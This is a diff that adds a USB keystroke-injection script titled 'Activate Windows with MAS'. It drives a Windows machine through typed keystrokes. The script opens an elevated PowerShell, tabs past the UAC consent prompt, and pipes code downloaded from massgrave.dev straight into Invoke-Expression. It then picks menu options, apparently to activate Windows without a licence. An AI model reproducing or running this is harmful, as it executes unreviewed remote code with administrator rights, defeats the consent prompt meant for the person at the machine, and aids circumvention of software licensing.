@@ -1,0 +1,27 @@
+REM ###########################################################
+REM #                                                         |
+REM # Title        : Activate Windows with MAS                 |
+REM # Author       : Zenin                                    |
+REM # Version      : 1.0                                      |
+REM # Category     : Good USB                                 |
+REM # Target       : Windows                                  |
+REM #                                                         |
+REM ###########################################################
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING irm https://massgrave.dev/get | iex
+ENTER
+DELAY 4000
+STRING 1
+DELAY 500
+STRING 1
+DELAY 500
+STRING 1
